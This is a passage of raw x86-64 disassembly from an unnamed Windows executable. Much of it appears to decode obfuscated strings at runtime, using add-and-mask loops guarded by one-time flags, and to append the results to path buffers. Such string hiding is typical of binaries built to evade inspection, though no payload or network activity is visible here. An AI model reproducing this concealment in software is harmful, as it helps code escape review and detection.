   14000438b:	66 0f 6f 05 1d 73 00 	movdqa 0x731d(%rip),%xmm0        # 0x14000b6b0
   140004392:	00 
   140004393:	66 0f 6f 0d 15 f1 2b 	movdqa 0x2bf115(%rip),%xmm1        # 0x1402c34b0
   14000439a:	00 
   14000439b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000439f:	66 0f 6f 15 79 72 00 	movdqa 0x7279(%rip),%xmm2        # 0x14000b620
   1400043a6:	00 
   1400043a7:	66 0f db ca          	pand   %xmm2,%xmm1
   1400043ab:	66 0f 7f 0d fd f0 2b 	movdqa %xmm1,0x2bf0fd(%rip)        # 0x1402c34b0
   1400043b2:	00 
   1400043b3:	66 0f 6f 0d 05 f1 2b 	movdqa 0x2bf105(%rip),%xmm1        # 0x1402c34c0
   1400043ba:	00 
   1400043bb:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400043bf:	66 0f db ca          	pand   %xmm2,%xmm1
   1400043c3:	66 0f 7f 0d f5 f0 2b 	movdqa %xmm1,0x2bf0f5(%rip)        # 0x1402c34c0
   1400043ca:	00 
   1400043cb:	66 0f 6f 0d fd f0 2b 	movdqa 0x2bf0fd(%rip),%xmm1        # 0x1402c34d0
   1400043d2:	00 
   1400043d3:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400043d7:	66 0f db ca          	pand   %xmm2,%xmm1
   1400043db:	66 0f 7f 0d ed f0 2b 	movdqa %xmm1,0x2bf0ed(%rip)        # 0x1402c34d0
   1400043e2:	00 
   1400043e3:	66 0f fd 05 f5 f0 2b 	paddw  0x2bf0f5(%rip),%xmm0        # 0x1402c34e0
   1400043ea:	00 
   1400043eb:	66 0f db c2          	pand   %xmm2,%xmm0
   1400043ef:	66 0f 7f 05 e9 f0 2b 	movdqa %xmm0,0x2bf0e9(%rip)        # 0x1402c34e0
   1400043f6:	00 
   1400043f7:	8b 05 f3 f0 2b 00    	mov    0x2bf0f3(%rip),%eax        # 0x1402c34f0
   1400043fd:	83 c0 29             	add    $0x29,%eax
   140004400:	0f b6 c0             	movzbl %al,%eax
   140004403:	66 89 05 e6 f0 2b 00 	mov    %ax,0x2bf0e6(%rip)        # 0x1402c34f0
   14000440a:	0f b7 05 e1 f0 2b 00 	movzwl 0x2bf0e1(%rip),%eax        # 0x1402c34f2
   140004411:	83 c0 29             	add    $0x29,%eax
   140004414:	0f b6 c0             	movzbl %al,%eax
   140004417:	66 89 05 d4 f0 2b 00 	mov    %ax,0x2bf0d4(%rip)        # 0x1402c34f2
   14000441e:	c6 05 cf f0 2b 00 00 	movb   $0x0,0x2bf0cf(%rip)        # 0x1402c34f4
   140004425:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   14000442a:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000442f:	4c 8d 0d 7a f0 2b 00 	lea    0x2bf07a(%rip),%r9        # 0x1402c34b0
   140004436:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   14000443d:	31 c9                	xor    %ecx,%ecx
   14000443f:	4d 89 f0             	mov    %r14,%r8
   140004442:	e8 a9 e9 ff ff       	call   0x140002df0
   140004447:	e9 fe 2b 00 00       	jmp    0x14000704a
   14000444c:	4b 8d 1c 74          	lea    (%r12,%r14,2),%rbx
   140004450:	80 3d 1c ee 2b 00 00 	cmpb   $0x0,0x2bee1c(%rip)        # 0x1402c3273
   140004457:	0f 85 70 fc ff ff    	jne    0x1400040cd
   14000445d:	c6 05 f0 ef 2b 00 01 	movb   $0x1,0x2beff0(%rip)        # 0x1402c3454
   140004464:	66 0f 6f 05 04 72 00 	movdqa 0x7204(%rip),%xmm0        # 0x14000b670
   14000446b:	00 
   14000446c:	66 0f 7f 05 cc ef 2b 	movdqa %xmm0,0x2befcc(%rip)        # 0x1402c3440
   140004473:	00 
   140004474:	c7 05 d2 ef 2b 00 71 	movl   $0x3f0071,0x2befd2(%rip)        # 0x1402c3450
   14000447b:	00 3f 00 
   14000447e:	48 8d 0d 6b 3c 00 00 	lea    0x3c6b(%rip),%rcx        # 0x1400080f0
   140004485:	e8 e6 ce ff ff       	call   0x140001370
   14000448a:	c6 05 e2 ed 2b 00 01 	movb   $0x1,0x2bede2(%rip)        # 0x1402c3273
   140004491:	80 3d bc ef 2b 00 00 	cmpb   $0x0,0x2befbc(%rip)        # 0x1402c3454
   140004498:	0f 85 38 fc ff ff    	jne    0x1400040d6
   14000449e:	e9 7a fc ff ff       	jmp    0x14000411d
   1400044a3:	31 ff                	xor    %edi,%edi
   1400044a5:	eb 04                	jmp    0x1400044ab
   1400044a7:	49 8d 3c 5c          	lea    (%r12,%rbx,2),%rdi
   1400044ab:	80 3d c5 ed 2b 00 00 	cmpb   $0x0,0x2bedc5(%rip)        # 0x1402c3277
   1400044b2:	0f 84 7c 2d 00 00    	je     0x140007234
   1400044b8:	80 3d 9f f0 2b 00 00 	cmpb   $0x0,0x2bf09f(%rip)        # 0x1402c355e
   1400044bf:	0f 84 f1 00 00 00    	je     0x1400045b6
   1400044c5:	f3 0f 7e 15 53 f0 2b 	movq   0x2bf053(%rip),%xmm2        # 0x1402c3520
   1400044cc:	00 
   1400044cd:	66 0f 6f 05 0b 72 00 	movdqa 0x720b(%rip),%xmm0        # 0x14000b6e0
   1400044d4:	00 
   1400044d5:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400044d9:	66 0f 6f 0d 7f 71 00 	movdqa 0x717f(%rip),%xmm1        # 0x14000b660
   1400044e0:	00 
   1400044e1:	66 0f db d1          	pand   %xmm1,%xmm2
   1400044e5:	f3 0f 7e 1d 3b f0 2b 	movq   0x2bf03b(%rip),%xmm3        # 0x1402c3528
   1400044ec:	00 
   1400044ed:	66 0f fd d8          	paddw  %xmm0,%xmm3
   1400044f1:	66 0f db d9          	pand   %xmm1,%xmm3
   1400044f5:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   1400044f9:	f3 0f 7f 15 1f f0 2b 	movdqu %xmm2,0x2bf01f(%rip)        # 0x1402c3520
   140004500:	00 
   140004501:	f3 0f 7e 15 27 f0 2b 	movq   0x2bf027(%rip),%xmm2        # 0x1402c3530
   140004508:	00 
   140004509:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000450d:	66 0f db d1          	pand   %xmm1,%xmm2
   140004511:	f3 0f 7e 1d 1f f0 2b 	movq   0x2bf01f(%rip),%xmm3        # 0x1402c3538
   140004518:	00 
   140004519:	66 0f fd d8          	paddw  %xmm0,%xmm3
   14000451d:	66 0f db d9          	pand   %xmm1,%xmm3
   140004521:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140004525:	f3 0f 7f 15 03 f0 2b 	movdqu %xmm2,0x2bf003(%rip)        # 0x1402c3530
   14000452c:	00 
   14000452d:	f3 0f 7e 15 0b f0 2b 	movq   0x2bf00b(%rip),%xmm2        # 0x1402c3540
   140004534:	00 
   140004535:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004539:	66 0f db d1          	pand   %xmm1,%xmm2
   14000453d:	f3 0f 7e 1d 03 f0 2b 	movq   0x2bf003(%rip),%xmm3        # 0x1402c3548
   140004544:	00 
   140004545:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140004549:	66 0f db d9          	pand   %xmm1,%xmm3
   14000454d:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140004551:	f3 0f 7f 15 e7 ef 2b 	movdqu %xmm2,0x2befe7(%rip)        # 0x1402c3540
   140004558:	00 
   140004559:	f3 0f 7e 15 ef ef 2b 	movq   0x2befef(%rip),%xmm2        # 0x1402c3550
   140004560:	00 
   140004561:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004565:	66 0f db d1          	pand   %xmm1,%xmm2
   140004569:	66 0f d6 15 df ef 2b 	movq   %xmm2,0x2befdf(%rip)        # 0x1402c3550
   140004570:	00 
   140004571:	b8 c9 00 00 00       	mov    $0xc9,%eax
   140004576:	8b 0d dc ef 2b 00    	mov    0x2befdc(%rip),%ecx        # 0x1402c3558
   14000457c:	01 c1                	add    %eax,%ecx
   14000457e:	0f b6 c9             	movzbl %cl,%ecx
   140004581:	66 89 0d d0 ef 2b 00 	mov    %cx,0x2befd0(%rip)        # 0x1402c3558
   140004588:	0f b7 0d cb ef 2b 00 	movzwl 0x2befcb(%rip),%ecx        # 0x1402c355a
   14000458f:	81 c1 c9 00 00 00    	add    $0xc9,%ecx
   140004595:	0f b6 c9             	movzbl %cl,%ecx
   140004598:	66 89 0d bb ef 2b 00 	mov    %cx,0x2befbb(%rip)        # 0x1402c355a
   14000459f:	03 05 b7 ef 2b 00    	add    0x2befb7(%rip),%eax        # 0x1402c355c
   1400045a5:	0f b6 c0             	movzbl %al,%eax
   1400045a8:	66 89 05 ad ef 2b 00 	mov    %ax,0x2befad(%rip)        # 0x1402c355c
   1400045af:	c6 05 a8 ef 2b 00 00 	movb   $0x0,0x2befa8(%rip)        # 0x1402c355e
   1400045b6:	48 8d 9d 30 0c 00 00 	lea    0xc30(%rbp),%rbx
   1400045bd:	48 89 d9             	mov    %rbx,%rcx
   1400045c0:	48 89 fa             	mov    %rdi,%rdx
   1400045c3:	e8 a8 59 00 00       	call   0x140009f70
   1400045c8:	48 8d 15 51 ef 2b 00 	lea    0x2bef51(%rip),%rdx        # 0x1402c3520
   1400045cf:	48 89 d9             	mov    %rbx,%rcx
   1400045d2:	e8 89 59 00 00       	call   0x140009f60
   1400045d7:	48 8d 8d 20 0a 00 00 	lea    0xa20(%rbp),%rcx
   1400045de:	48 89 da             	mov    %rbx,%rdx
   1400045e1:	e8 1a 5a 00 00       	call   0x14000a000
   1400045e6:	85 c0                	test   %eax,%eax
   1400045e8:	74 19                	je     0x140004603
   1400045ea:	48 c7 85 50 10 00 00 	movq   $0xfffffffffe363c80,0x1050(%rbp)
   1400045f1:	80 3c 36 fe 
   1400045f5:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   1400045fc:	31 c9                	xor    %ecx,%ecx
   1400045fe:	e8 d3 ce ff ff       	call   0x1400014d6
   140004603:	48 8d 8d e0 01 00 00 	lea    0x1e0(%rbp),%rcx
   14000460a:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004610:	31 d2                	xor    %edx,%edx
   140004612:	e8 49 5a 00 00       	call   0x14000a060
   140004617:	80 3d 5a ec 2b 00 00 	cmpb   $0x0,0x2bec5a(%rip)        # 0x1402c3278
   14000461e:	0f 84 41 2c 00 00    	je     0x140007265
   140004624:	80 3d 47 ef 2b 00 00 	cmpb   $0x0,0x2bef47(%rip)        # 0x1402c3572
   14000462b:	74 3c                	je     0x140004669
   14000462d:	66 0f 6f 05 2b ef 2b 	movdqa 0x2bef2b(%rip),%xmm0        # 0x1402c3560
   140004634:	00 
   140004635:	66 0f fd 05 c3 70 00 	paddw  0x70c3(%rip),%xmm0        # 0x14000b700
   14000463c:	00 
   14000463d:	66 0f db 05 db 6f 00 	pand   0x6fdb(%rip),%xmm0        # 0x14000b620
   140004644:	00 
   140004645:	66 0f 7f 05 13 ef 2b 	movdqa %xmm0,0x2bef13(%rip)        # 0x1402c3560
   14000464c:	00 
   14000464d:	b8 85 00 00 00       	mov    $0x85,%eax
   140004652:	03 05 18 ef 2b 00    	add    0x2bef18(%rip),%eax        # 0x1402c3570
   140004658:	0f b6 c0             	movzbl %al,%eax
   14000465b:	66 89 05 0e ef 2b 00 	mov    %ax,0x2bef0e(%rip)        # 0x1402c3570
   140004662:	c6 05 09 ef 2b 00 00 	movb   $0x0,0x2bef09(%rip)        # 0x1402c3572
   140004669:	4c 8d bd e0 01 00 00 	lea    0x1e0(%rbp),%r15
   140004670:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140004677:	4c 89 f9             	mov    %r15,%rcx
   14000467a:	e8 f1 58 00 00       	call   0x140009f70
   14000467f:	48 8d 15 da ee 2b 00 	lea    0x2beeda(%rip),%rdx        # 0x1402c3560
   140004686:	4c 89 f9             	mov    %r15,%rcx
   140004689:	e8 d2 58 00 00       	call   0x140009f60
   14000468e:	48 8d 8d 00 06 00 00 	lea    0x600(%rbp),%rcx
   140004695:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000469b:	31 d2                	xor    %edx,%edx
   14000469d:	e8 be 59 00 00       	call   0x14000a060
   1400046a2:	80 3d d0 eb 2b 00 00 	cmpb   $0x0,0x2bebd0(%rip)        # 0x1402c3279
   1400046a9:	0f 84 fb 2b 00 00    	je     0x1400072aa
   1400046af:	80 3d e2 ee 2b 00 00 	cmpb   $0x0,0x2beee2(%rip)        # 0x1402c3598
   1400046b6:	74 47                	je     0x1400046ff
   1400046b8:	66 0f 6f 05 c0 ee 2b 	movdqa 0x2beec0(%rip),%xmm0        # 0x1402c3580
   1400046bf:	00 
   1400046c0:	66 0f fd 05 58 70 00 	paddw  0x7058(%rip),%xmm0        # 0x14000b720
   1400046c7:	00 
   1400046c8:	66 0f db 05 50 6f 00 	pand   0x6f50(%rip),%xmm0        # 0x14000b620
   1400046cf:	00 
   1400046d0:	66 0f 7f 05 a8 ee 2b 	movdqa %xmm0,0x2beea8(%rip)        # 0x1402c3580
   1400046d7:	00 
   1400046d8:	f3 0f 7e 05 b0 ee 2b 	movq   0x2beeb0(%rip),%xmm0        # 0x1402c3590
   1400046df:	00 
   1400046e0:	66 0f fd 05 48 70 00 	paddw  0x7048(%rip),%xmm0        # 0x14000b730
   1400046e7:	00 
   1400046e8:	66 0f db 05 70 6f 00 	pand   0x6f70(%rip),%xmm0        # 0x14000b660
   1400046ef:	00 
   1400046f0:	66 0f d6 05 98 ee 2b 	movq   %xmm0,0x2bee98(%rip)        # 0x1402c3590
   1400046f7:	00 
   1400046f8:	c6 05 99 ee 2b 00 00 	movb   $0x0,0x2bee99(%rip)        # 0x1402c3598
   1400046ff:	48 8d bd 00 06 00 00 	lea    0x600(%rbp),%rdi
   140004706:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   14000470d:	48 89 f9             	mov    %rdi,%rcx
   140004710:	e8 5b 58 00 00       	call   0x140009f70
   140004715:	48 8d 15 64 ee 2b 00 	lea    0x2bee64(%rip),%rdx        # 0x1402c3580
   14000471c:	48 89 f9             	mov    %rdi,%rcx
   14000471f:	e8 3c 58 00 00       	call   0x140009f60
   140004724:	48 8d 8d f0 03 00 00 	lea    0x3f0(%rbp),%rcx
   14000472b:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004731:	31 d2                	xor    %edx,%edx
   140004733:	e8 28 59 00 00       	call   0x14000a060
   140004738:	80 3d 3b eb 2b 00 00 	cmpb   $0x0,0x2beb3b(%rip)        # 0x1402c327a
   14000473f:	0f 84 b2 2b 00 00    	je     0x1400072f7
   140004745:	80 3d 64 ee 2b 00 00 	cmpb   $0x0,0x2bee64(%rip)        # 0x1402c35b0
   14000474c:	74 27                	je     0x140004775
   14000474e:	66 0f 6f 05 4a ee 2b 	movdqa 0x2bee4a(%rip),%xmm0        # 0x1402c35a0
   140004755:	00 
   140004756:	66 0f fd 05 f2 6f 00 	paddw  0x6ff2(%rip),%xmm0        # 0x14000b750
   14000475d:	00 
   14000475e:	66 0f db 05 ba 6e 00 	pand   0x6eba(%rip),%xmm0        # 0x14000b620
   140004765:	00 
   140004766:	66 0f 7f 05 32 ee 2b 	movdqa %xmm0,0x2bee32(%rip)        # 0x1402c35a0
   14000476d:	00 
   14000476e:	c6 05 3b ee 2b 00 00 	movb   $0x0,0x2bee3b(%rip)        # 0x1402c35b0
   140004775:	48 8d bd f0 03 00 00 	lea    0x3f0(%rbp),%rdi
   14000477c:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140004783:	48 89 f9             	mov    %rdi,%rcx
   140004786:	e8 e5 57 00 00       	call   0x140009f70
   14000478b:	48 8d 15 0e ee 2b 00 	lea    0x2bee0e(%rip),%rdx        # 0x1402c35a0
   140004792:	48 89 f9             	mov    %rdi,%rcx
   140004795:	e8 c6 57 00 00       	call   0x140009f60
   14000479a:	80 3d da ea 2b 00 00 	cmpb   $0x0,0x2beada(%rip)        # 0x1402c327b
   1400047a1:	0f 84 8c 2b 00 00    	je     0x140007333
   1400047a7:	80 3d e8 ee 2b 00 00 	cmpb   $0x0,0x2beee8(%rip)        # 0x1402c3696
   1400047ae:	0f 84 85 01 00 00    	je     0x140004939
   1400047b4:	66 0f 6f 05 a4 6f 00 	movdqa 0x6fa4(%rip),%xmm0        # 0x14000b760
   1400047bb:	00 
   1400047bc:	66 0f 6f 15 fc ed 2b 	movdqa 0x2bedfc(%rip),%xmm2        # 0x1402c35c0
   1400047c3:	00 
   1400047c4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400047c8:	66 0f 6f 0d 50 6e 00 	movdqa 0x6e50(%rip),%xmm1        # 0x14000b620
   1400047cf:	00 
   1400047d0:	66 0f db d1          	pand   %xmm1,%xmm2
   1400047d4:	66 0f 7f 15 e4 ed 2b 	movdqa %xmm2,0x2bede4(%rip)        # 0x1402c35c0
   1400047db:	00 
   1400047dc:	66 0f 6f 15 ec ed 2b 	movdqa 0x2bedec(%rip),%xmm2        # 0x1402c35d0
   1400047e3:	00 
   1400047e4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400047e8:	66 0f db d1          	pand   %xmm1,%xmm2
   1400047ec:	66 0f 7f 15 dc ed 2b 	movdqa %xmm2,0x2beddc(%rip)        # 0x1402c35d0
   1400047f3:	00 
   1400047f4:	66 0f 6f 15 e4 ed 2b 	movdqa 0x2bede4(%rip),%xmm2        # 0x1402c35e0
   1400047fb:	00 
   1400047fc:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004800:	66 0f db d1          	pand   %xmm1,%xmm2
   140004804:	66 0f 7f 15 d4 ed 2b 	movdqa %xmm2,0x2bedd4(%rip)        # 0x1402c35e0
   14000480b:	00 
   14000480c:	66 0f 6f 15 dc ed 2b 	movdqa 0x2beddc(%rip),%xmm2        # 0x1402c35f0
   140004813:	00 
   140004814:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004818:	66 0f db d1          	pand   %xmm1,%xmm2
   14000481c:	66 0f 7f 15 cc ed 2b 	movdqa %xmm2,0x2bedcc(%rip)        # 0x1402c35f0
   140004823:	00 
   140004824:	66 0f 6f 15 d4 ed 2b 	movdqa 0x2bedd4(%rip),%xmm2        # 0x1402c3600
   14000482b:	00 
   14000482c:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004830:	66 0f db d1          	pand   %xmm1,%xmm2
   140004834:	66 0f 7f 15 c4 ed 2b 	movdqa %xmm2,0x2bedc4(%rip)        # 0x1402c3600
   14000483b:	00 
   14000483c:	66 0f 6f 15 cc ed 2b 	movdqa 0x2bedcc(%rip),%xmm2        # 0x1402c3610
   140004843:	00 
   140004844:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004848:	66 0f db d1          	pand   %xmm1,%xmm2
   14000484c:	66 0f 7f 15 bc ed 2b 	movdqa %xmm2,0x2bedbc(%rip)        # 0x1402c3610
   140004853:	00 
   140004854:	66 0f 6f 15 c4 ed 2b 	movdqa 0x2bedc4(%rip),%xmm2        # 0x1402c3620
   14000485b:	00 
   14000485c:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004860:	66 0f db d1          	pand   %xmm1,%xmm2
   140004864:	66 0f 7f 15 b4 ed 2b 	movdqa %xmm2,0x2bedb4(%rip)        # 0x1402c3620
   14000486b:	00 
   14000486c:	66 0f 6f 15 bc ed 2b 	movdqa 0x2bedbc(%rip),%xmm2        # 0x1402c3630
   140004873:	00 
   140004874:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004878:	66 0f db d1          	pand   %xmm1,%xmm2
   14000487c:	66 0f 7f 15 ac ed 2b 	movdqa %xmm2,0x2bedac(%rip)        # 0x1402c3630
   140004883:	00 
   140004884:	66 0f 6f 15 b4 ed 2b 	movdqa 0x2bedb4(%rip),%xmm2        # 0x1402c3640
   14000488b:	00 
   14000488c:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004890:	66 0f db d1          	pand   %xmm1,%xmm2
   140004894:	66 0f 7f 15 a4 ed 2b 	movdqa %xmm2,0x2beda4(%rip)        # 0x1402c3640
   14000489b:	00 
   14000489c:	66 0f 6f 15 ac ed 2b 	movdqa 0x2bedac(%rip),%xmm2        # 0x1402c3650
   1400048a3:	00 
   1400048a4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400048a8:	66 0f db d1          	pand   %xmm1,%xmm2
   1400048ac:	66 0f 7f 15 9c ed 2b 	movdqa %xmm2,0x2bed9c(%rip)        # 0x1402c3650
   1400048b3:	00 
   1400048b4:	66 0f 6f 15 a4 ed 2b 	movdqa 0x2beda4(%rip),%xmm2        # 0x1402c3660
   1400048bb:	00 
   1400048bc:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400048c0:	66 0f db d1          	pand   %xmm1,%xmm2
   1400048c4:	66 0f 7f 15 94 ed 2b 	movdqa %xmm2,0x2bed94(%rip)        # 0x1402c3660
   1400048cb:	00 
   1400048cc:	66 0f 6f 15 9c ed 2b 	movdqa 0x2bed9c(%rip),%xmm2        # 0x1402c3670
   1400048d3:	00 
   1400048d4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400048d8:	66 0f db d1          	pand   %xmm1,%xmm2
   1400048dc:	66 0f 7f 15 8c ed 2b 	movdqa %xmm2,0x2bed8c(%rip)        # 0x1402c3670
   1400048e3:	00 
   1400048e4:	66 0f fd 05 94 ed 2b 	paddw  0x2bed94(%rip),%xmm0        # 0x1402c3680
   1400048eb:	00 
   1400048ec:	66 0f db c1          	pand   %xmm1,%xmm0
   1400048f0:	66 0f 7f 05 88 ed 2b 	movdqa %xmm0,0x2bed88(%rip)        # 0x1402c3680
   1400048f7:	00 
   1400048f8:	8b 05 92 ed 2b 00    	mov    0x2bed92(%rip),%eax        # 0x1402c3690
   1400048fe:	83 c0 5b             	add    $0x5b,%eax
   140004901:	0f b6 c0             	movzbl %al,%eax
   140004904:	66 89 05 85 ed 2b 00 	mov    %ax,0x2bed85(%rip)        # 0x1402c3690
   14000490b:	0f b7 05 80 ed 2b 00 	movzwl 0x2bed80(%rip),%eax        # 0x1402c3692
   140004912:	83 c0 5b             	add    $0x5b,%eax
   140004915:	0f b6 c0             	movzbl %al,%eax
   140004918:	66 89 05 73 ed 2b 00 	mov    %ax,0x2bed73(%rip)        # 0x1402c3692
   14000491f:	8b 05 6f ed 2b 00    	mov    0x2bed6f(%rip),%eax        # 0x1402c3694
   140004925:	83 c0 5b             	add    $0x5b,%eax
   140004928:	0f b6 c0             	movzbl %al,%eax
   14000492b:	66 89 05 62 ed 2b 00 	mov    %ax,0x2bed62(%rip)        # 0x1402c3694
   140004932:	c6 05 5d ed 2b 00 00 	movb   $0x0,0x2bed5d(%rip)        # 0x1402c3696
   140004939:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000493e:	4c 8d 0d 7b ec 2b 00 	lea    0x2bec7b(%rip),%r9        # 0x1402c35c0
   140004945:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   14000494c:	b1 01                	mov    $0x1,%cl
   14000494e:	4d 89 f0             	mov    %r14,%r8
   140004951:	e8 9a e4 ff ff       	call   0x140002df0
   140004956:	80 3d 1f e9 2b 00 00 	cmpb   $0x0,0x2be91f(%rip)        # 0x1402c327c
   14000495d:	0f 84 15 2a 00 00    	je     0x140007378
   140004963:	80 3d 9c ed 2b 00 00 	cmpb   $0x0,0x2bed9c(%rip)        # 0x1402c3706
   14000496a:	0f 84 dd 00 00 00    	je     0x140004a4d
   140004970:	66 0f 6f 05 f8 6d 00 	movdqa 0x6df8(%rip),%xmm0        # 0x14000b770
   140004977:	00 
   140004978:	66 0f 6f 0d 20 ed 2b 	movdqa 0x2bed20(%rip),%xmm1        # 0x1402c36a0
   14000497f:	00 
   140004980:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004984:	66 0f 6f 15 94 6c 00 	movdqa 0x6c94(%rip),%xmm2        # 0x14000b620
   14000498b:	00 
   14000498c:	66 0f db ca          	pand   %xmm2,%xmm1
   140004990:	66 0f 7f 0d 08 ed 2b 	movdqa %xmm1,0x2bed08(%rip)        # 0x1402c36a0
   140004997:	00 
   140004998:	66 0f 6f 0d 10 ed 2b 	movdqa 0x2bed10(%rip),%xmm1        # 0x1402c36b0
   14000499f:	00 
   1400049a0:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400049a4:	66 0f db ca          	pand   %xmm2,%xmm1
   1400049a8:	66 0f 7f 0d 00 ed 2b 	movdqa %xmm1,0x2bed00(%rip)        # 0x1402c36b0
   1400049af:	00 
   1400049b0:	66 0f 6f 0d 08 ed 2b 	movdqa 0x2bed08(%rip),%xmm1        # 0x1402c36c0
   1400049b7:	00 
   1400049b8:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400049bc:	66 0f db ca          	pand   %xmm2,%xmm1
   1400049c0:	66 0f 7f 0d f8 ec 2b 	movdqa %xmm1,0x2becf8(%rip)        # 0x1402c36c0
   1400049c7:	00 
   1400049c8:	66 0f 6f 0d 00 ed 2b 	movdqa 0x2bed00(%rip),%xmm1        # 0x1402c36d0
   1400049cf:	00 
   1400049d0:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400049d4:	66 0f db ca          	pand   %xmm2,%xmm1
   1400049d8:	66 0f 7f 0d f0 ec 2b 	movdqa %xmm1,0x2becf0(%rip)        # 0x1402c36d0
   1400049df:	00 
   1400049e0:	66 0f 6f 0d f8 ec 2b 	movdqa 0x2becf8(%rip),%xmm1        # 0x1402c36e0
   1400049e7:	00 
   1400049e8:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400049ec:	66 0f db ca          	pand   %xmm2,%xmm1
   1400049f0:	66 0f 7f 0d e8 ec 2b 	movdqa %xmm1,0x2bece8(%rip)        # 0x1402c36e0
   1400049f7:	00 
   1400049f8:	66 0f fd 05 f0 ec 2b 	paddw  0x2becf0(%rip),%xmm0        # 0x1402c36f0
   1400049ff:	00 
   140004a00:	66 0f db c2          	pand   %xmm2,%xmm0
   140004a04:	66 0f 7f 05 e4 ec 2b 	movdqa %xmm0,0x2bece4(%rip)        # 0x1402c36f0
   140004a0b:	00 
   140004a0c:	8b 05 ee ec 2b 00    	mov    0x2becee(%rip),%eax        # 0x1402c3700
   140004a12:	83 c0 79             	add    $0x79,%eax
   140004a15:	0f b6 c0             	movzbl %al,%eax
   140004a18:	66 89 05 e1 ec 2b 00 	mov    %ax,0x2bece1(%rip)        # 0x1402c3700
   140004a1f:	0f b7 05 dc ec 2b 00 	movzwl 0x2becdc(%rip),%eax        # 0x1402c3702
   140004a26:	83 c0 79             	add    $0x79,%eax
   140004a29:	0f b6 c0             	movzbl %al,%eax
   140004a2c:	66 89 05 cf ec 2b 00 	mov    %ax,0x2beccf(%rip)        # 0x1402c3702
   140004a33:	8b 05 cb ec 2b 00    	mov    0x2beccb(%rip),%eax        # 0x1402c3704
   140004a39:	83 c0 79             	add    $0x79,%eax
   140004a3c:	0f b6 c0             	movzbl %al,%eax
   140004a3f:	66 89 05 be ec 2b 00 	mov    %ax,0x2becbe(%rip)        # 0x1402c3704
   140004a46:	c6 05 b9 ec 2b 00 00 	movb   $0x0,0x2becb9(%rip)        # 0x1402c3706
   140004a4d:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140004a52:	4c 8d 0d 47 ec 2b 00 	lea    0x2bec47(%rip),%r9        # 0x1402c36a0
   140004a59:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140004a60:	31 c9                	xor    %ecx,%ecx
   140004a62:	4d 89 f8             	mov    %r15,%r8
   140004a65:	e8 86 e3 ff ff       	call   0x140002df0
   140004a6a:	48 8d 8d 10 08 00 00 	lea    0x810(%rbp),%rcx
   140004a71:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004a77:	31 d2                	xor    %edx,%edx
   140004a79:	e8 e2 55 00 00       	call   0x14000a060
   140004a7e:	80 3d f8 e7 2b 00 00 	cmpb   $0x0,0x2be7f8(%rip)        # 0x1402c327d
   140004a85:	0f 84 80 29 00 00    	je     0x14000740b
   140004a8b:	80 3d 90 ec 2b 00 00 	cmpb   $0x0,0x2bec90(%rip)        # 0x1402c3722
   140004a92:	74 3a                	je     0x140004ace
   140004a94:	66 0f 6f 05 74 ec 2b 	movdqa 0x2bec74(%rip),%xmm0        # 0x1402c3710
   140004a9b:	00 
   140004a9c:	66 0f fd 05 ec 6c 00 	paddw  0x6cec(%rip),%xmm0        # 0x14000b790
   140004aa3:	00 
   140004aa4:	66 0f db 05 74 6b 00 	pand   0x6b74(%rip),%xmm0        # 0x14000b620
   140004aab:	00 
   140004aac:	66 0f 7f 05 5c ec 2b 	movdqa %xmm0,0x2bec5c(%rip)        # 0x1402c3710
   140004ab3:	00 
   140004ab4:	8b 05 66 ec 2b 00    	mov    0x2bec66(%rip),%eax        # 0x1402c3720
   140004aba:	83 c0 0b             	add    $0xb,%eax
   140004abd:	0f b6 c0             	movzbl %al,%eax
   140004ac0:	66 89 05 59 ec 2b 00 	mov    %ax,0x2bec59(%rip)        # 0x1402c3720
   140004ac7:	c6 05 54 ec 2b 00 00 	movb   $0x0,0x2bec54(%rip)        # 0x1402c3722
   140004ace:	4c 8d b5 10 08 00 00 	lea    0x810(%rbp),%r14
   140004ad5:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140004adc:	4c 89 f1             	mov    %r14,%rcx
   140004adf:	e8 8c 54 00 00       	call   0x140009f70
   140004ae4:	48 8d 15 25 ec 2b 00 	lea    0x2bec25(%rip),%rdx        # 0x1402c3710
   140004aeb:	4c 89 f1             	mov    %r14,%rcx
